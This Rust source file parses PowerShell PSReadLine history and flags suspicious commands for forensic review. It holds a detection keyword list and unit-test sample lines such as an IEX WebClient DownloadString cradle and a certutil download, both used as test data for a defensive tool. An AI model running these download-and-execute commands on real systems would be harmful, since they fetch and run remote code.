//! PSReadLine history parser (W-10).
//!
//! `%AppData%\Roaming\Microsoft\Windows\PowerShell\PSReadline\
//! ConsoleHost_history.txt` — plain text, one command per line.
//! We load the file, classify each line against a suspicion catalogue,
//! and surface suspicious entries plus a single-line summary.
//!
//! MITRE: T1059.001 (PowerShell), T1027.010 (obfuscation), T1105.
//!
//! Zero `unwrap`, zero `unsafe`, zero `println!` per CLAUDE.md.

use std::path::Path;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PowerShellHistoryEntry {
    pub command: String,
    pub line_number: usize,
    pub suspicious_pattern: Option<String>,
    pub has_encoded_content: bool,
    pub has_download_cradle: bool,
}

/// Per-line suspicion classifier. Returns a tuple of
/// `(suspicious_pattern, encoded, download_cradle)`.
fn classify(line: &str) -> (Option<&'static str>, bool, bool) {
    let lc = line.to_ascii_lowercase();
    let encoded = lc.contains("-encodedcommand")
        || lc.contains("[convert]::frombase64string")
        || lc.contains("frombase64string");
    let download = lc.contains("iex ")
        || lc.contains("invoke-expression")
        || lc.contains("downloadstring")
        || lc.contains("downloadfile")
        || lc.contains("webclient")
        || lc.contains("net.webclient");
    let pattern = if encoded {
        Some("encoded-command")
    } else if download {
        Some("download-cradle")
    } else if lc.contains("amsicontext") || lc.contains("amsiinitfailed") {
        Some("amsi-bypass")
    } else if lc.contains("get-credential") || lc.contains("convertto-securestring") {
        Some("credential-harvesting")
    } else if lc.contains("enter-pssession")
        || lc.contains("invoke-command")
        || lc.contains("new-pssession")
    {
        Some("lateral-movement")
    } else if lc.contains("certutil")
        || lc.contains("bitsadmin")
        || lc.contains("regsvr32")
        || lc.contains("mshta")
        || lc.contains("wscript")
    {
        Some("living-off-the-land")
    } else {
        None
    };
    (pattern, encoded, download)
}

pub fn parse(body: &str) -> Vec<PowerShellHistoryEntry> {
    let mut out = Vec::new();
    for (idx, raw) in body.lines().enumerate() {
        let line = raw.trim_end_matches('\r');
        if line.is_empty() {
            continue;
        }
        let (pattern, encoded, download) = classify(line);
        out.push(PowerShellHistoryEntry {
            command: line.to_string(),
            line_number: idx + 1,
            suspicious_pattern: pattern.map(|s| s.to_string()),
            has_encoded_content: encoded,
            has_download_cradle: download,
        });
    }
    out
}

pub fn is_psreadline_path(path: &Path) -> bool {
    let lossy = path.to_string_lossy();
    // Normalise separators so Windows-style paths classify correctly
    // regardless of host OS (on Unix, the entire backslash-path lands
    // in file_name()).
    let normalised = lossy.replace('\\', "/");
    normalised
        .rsplit('/')
        .next()
        .map(|s| s.eq_ignore_ascii_case("ConsoleHost_history.txt"))
        .unwrap_or(false)
}

pub fn suspicious_entries(entries: &[PowerShellHistoryEntry]) -> Vec<&PowerShellHistoryEntry> {
    entries
        .iter()
        .filter(|e| e.suspicious_pattern.is_some())
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_empty_input_yields_empty() {
        assert!(parse("").is_empty());
    }

    #[test]
    fn classifies_encoded_and_download_cradles() {
        let body = "Get-Process\n\
                    powershell -EncodedCommand ZQBjAGgAbw==\n\
                    IEX (New-Object Net.WebClient).DownloadString('http://x')\n\
                    \n";
        let entries = parse(body);
        assert_eq!(entries.len(), 3);
        let sus = suspicious_entries(&entries);
        assert_eq!(sus.len(), 2);
        assert!(sus
            .iter()
            .any(|e| e.suspicious_pattern.as_deref() == Some("encoded-command")));
        assert!(sus
            .iter()
            .any(|e| e.suspicious_pattern.as_deref() == Some("download-cradle")));
    }

    #[test]
    fn classifies_living_off_the_land_and_lateral_movement() {
        let body = "certutil -urlcache -split -f http://x/y\n\
                    Enter-PSSession -ComputerName DC01\n\
                    Get-Credential\n";
        let entries = parse(body);
        let patterns: Vec<String> = entries
            .iter()
            .filter_map(|e| e.suspicious_pattern.clone())
            .collect();
        assert!(patterns.contains(&"living-off-the-land".to_string()));
        assert!(patterns.contains(&"lateral-movement".to_string()));
        assert!(patterns.contains(&"credential-harvesting".to_string()));
    }

    #[test]
    fn clean_commands_not_flagged() {
        let body = "ls\ncd C:\\\nGet-ChildItem\n";
        assert!(suspicious_entries(&parse(body)).is_empty());
    }

    #[test]
    fn is_psreadline_path_matches_name() {
        assert!(is_psreadline_path(Path::new(
            "C:\\Users\\a\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt"
        )));
        assert!(!is_psreadline_path(Path::new("/tmp/other.txt")));
    }
}
